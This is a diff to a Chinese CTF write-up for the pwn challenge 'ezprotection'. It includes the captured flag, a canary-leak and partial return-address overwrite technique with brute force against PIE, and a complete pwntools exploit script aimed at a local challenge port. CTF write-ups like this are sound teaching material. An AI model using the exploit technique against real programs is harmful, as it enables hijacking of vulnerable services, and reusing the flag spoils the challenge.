@@ -3248,9 +3248,10 @@ do_system (line=0x404060 <desc> "") at ../sysdeps/posix/system.c:103
 ## ezprotection
 
 > [!NOTE]
-> **FLAG:** `moectf{}`
-
-Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。
+> **FLAG:** `moectf{Just-SoME-eAsY_pr0T3ct1ON87a0ccb2}`，后面可能是随机的。
+<!---->
+> [!TIP]
+> Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。
 
 我们说，通常情况下栈溢出均是溢出栈上的局部变量，从而让多出来的数据覆盖到返回地址等，从而达到劫持控制流的目的。但加入 Canary 保护后，栈会在局部变量的上面、`saved RBP` 的下面插入一个 Canary，当函数返回时（栈帧销毁前）会先验证 Canary 是否与之前一致，若不一致则停止运行。若我们仍然采用原初的溢出手段，PADDING 会直接覆盖掉 Canary，导致我们无法通过验证。
 
@@ -3314,7 +3315,7 @@ unsigned __int64 vuln()
 
 等等…既然 Canary 的第一个字节是 `\x00`，那我们不让它成为 `\x00` 不就好了？倘若我们构造 `buf` 的值，让它刚好将 Canary 的第一个字节写掉，那后面 `puts` 不就能打印整个 Canary 了吗？😎
 
-紧接着，`puts` 打印了连贯的 `buf`，包括前面的 PADDING、第一位被修改的 Canary、`saved RBP` 还有返回地址（的低 2 位，考虑到小端序）。这是极好的——我们可以就此推算出完整的 Canary。但后续的第二次 `read` 却让我们犯了难：它至多也只能写入返回地址的低 2 位……怎么才能把 `backdoor()` 写进去呢？🤔
+紧接着，`puts` 打印了连贯的 `buf`，包括前面的 PADDING、第一位被修改的 Canary、`saved RBP` 还有返回地址（的低 2 位，考虑到小端序）。这是极好的——我们可以就此推算出完整的 Canary，以及 `backdoor()` 的地址。但后续的第二次 `read` 却让我们犯了难：它至多也只能写入返回地址的低 2 位……怎么才能把 `backdoor()` 写进去呢？🤔
 
 别急，如果我们在 IDA Pro 中查看函数地址：
 
@@ -3323,7 +3324,124 @@ unsigned __int64 vuln()
 `backdoor` -> 0x1229
 ```
 
-会发现：这两个地址均只有低 2 位字节！这就好说了，`vuln` 本来是要跳转到 `main` 的，这已经保证了它的高 6 位字节绝对干净；故我们只需要覆写低 2 位即可！
+会发现：这两个地址均只有低 2 位字节！这就好说了，`vuln` 本来是要跳转到 `main` 的，这已经保证了它的高 6 位字节绝对干净；故我们只需要覆写低 2 位即可！跳转到 `backdoor` 里，万事大吉……啊？
+
+```c
+void __noreturn backdoor()
+{
+    _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF
+
+    buf[1] = __readfsqword(0x28u);
+    puts("Give me the password!");
+    read(0, buf, 8uLL);
+    if ( buf[0] == password )
+    {
+        puts("You find the secret:");
+        fd = open("/flag", 0);
+        if ( fd == -1 )
+        {
+            puts("Failed to open flag file.");
+            exit(1);
+        }
+        read(fd, &flag, 0x64uLL);
+        write(1, &flag, 0x64uLL);
+        close(fd);
+    }
+    exit(0);
+}
+```
+
+666 原来那个密码是在这里用的 😡 看来我们要改变策略，既然我们不知道也不想知道密码，我们直接跳转到 `if ( buf[0] == password )` 块判断成功的地方！哈哈哈，道高一尺，魔高一丈。
+
+> [!NOTE]
+> 从 `if` 块跳转开始（排版有优化）：
+>
+> ```asm
+> .text:000000000000127D    lea     rax, aYouFindTheSecr ; "You find the secret:"
+> .text:0000000000001284    mov     rdi, rax        ; s
+> .text:0000000000001287    call    _puts
+> .text:000000000000128C    mov     esi, 0          ; oflag
+> .text:0000000000001291    lea     rax, file       ; "/flag"
+> .text:0000000000001298    mov     rdi, rax        ; file
+> .text:000000000000129B    mov     eax, 0
+> .text:00000000000012A0    call    _open
+> .text:00000000000012A5    mov     cs:fd, eax
+> .text:00000000000012AB    mov     eax, cs:fd
+> .text:00000000000012B1    cmp     eax, 0FFFFFFFFh
+> .text:00000000000012B4    jnz     short loc_12CF
+> .text:00000000000012B6    lea     rax, aFailedToOpenFl ; "Failed to open flag file."
+> .text:00000000000012BD    mov     rdi, rax        ; s
+> .text:00000000000012C0    call    _puts
+> .text:00000000000012C5    mov     edi, 1          ; status
+> .text:00000000000012CA    call    _exit
+> ```
+>
+> 星澜音尝试将地址指向 `0x127D`，但程序即刻寸止，极为诡异。
+>
+> ![程序在读取 `flag` 时 EOF](./get_eof_while_reading_flag.png)
+>
+> 将地址指向 `0x128C` 即可解决。👊
+
+不过虽说写入低 2 位字节，可这 4 个十六进制位，由于 PIE 的特性，绝对地址的后三位是和相对地址一样的。倒数第四位由 PIE 确定，而星澜音也未能成功让第一次 `read()` 从栈上将 `return addr` 泄露出来，这更为诡异。但道高一尺魔高 114,514 丈，考虑到 boom(_revenge) 带给我们的经验，星澜音干脆将第 4 个十六进制位设为 `1`，以 $\dfrac{1}{16}$ 的概率努力爆破即可。最终在尝试 26 次后成功。下面给出一个 `exploit.py`，由于星澜音精神不振，该 `exploit.py` 由 Gemini 代笔。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# 设置 pwntools 上下文
+context.arch = 'amd64'
+# context.log_level = 'debug' # 调试时开启
+
+# --- 连接目标 ---
+# p = process('./pwn')
+p = remote('127.0.0.1', 7290)
+
+# --- 第 1 步：可靠地泄露 Canary ---
+
+# 构造 payload 1，仅用于泄露 Canary。
+# 发送25字节可以覆盖 buf(24) 和 canary 的第一个 \x00 字节。
+payload1 = b'A' * 25
+
+log.info("发送 payload 1 以可靠地泄露 Canary...")
+p.sendafter(b"watching over you.\n", payload1)
+
+# `puts` 会回显我们的 payload，后面紧跟着 Canary 的高7位。
+# 我们先接收到回显的 payload 部分，确保接收指针正确。
+p.recvuntil(payload1)
+
+# 然后精确地接收剩下的 7 个字节，这就是 Canary 的部分。
+try:
+    canary_rest = p.recvn(7)
+    canary = u64(b'\x00' + canary_rest)
+    log.success(f"成功泄露 Canary: {hex(canary)}")
+except EOFError:
+    log.error("接收 Canary 失败。程序可能已崩溃或输出不符合预期。")
+    p.close()
+    exit()
+
+
+# --- 第 2 步：构造最终 Payload 进行部分地址覆盖 ---
+
+# 目标地址的偏移量是 0x127D。我们只需要它的低2个字节。
+target_low_bytes = 0x128C
+
+# 构造 payload 2: 填充buf + 正确的Canary + 填充rbp + 目标地址的低2字节
+payload2 = b'A' * 24
+payload2 += p64(canary)
+payload2 += b'B' * 8  # 覆盖 RBP，内容无所谓
+payload2 += p16(target_low_bytes) # 使用 p16 精确覆盖返回地址的低2字节
+
+log.info("发送最终 payload 以劫持控制流...")
+# 在第二次提示后发送。用 sendline 因为 read 需要换行符。
+p.sendlineafter(b"anyway.\n", payload2)
+
+
+# --- 第 3 步：获取 Flag ---
+log.success("Payload 已发送！切换到交互模式以获取 flag...")
+time.sleep(0.1)
+
+p.interactive()
+```
 
 ## fmt_S
 
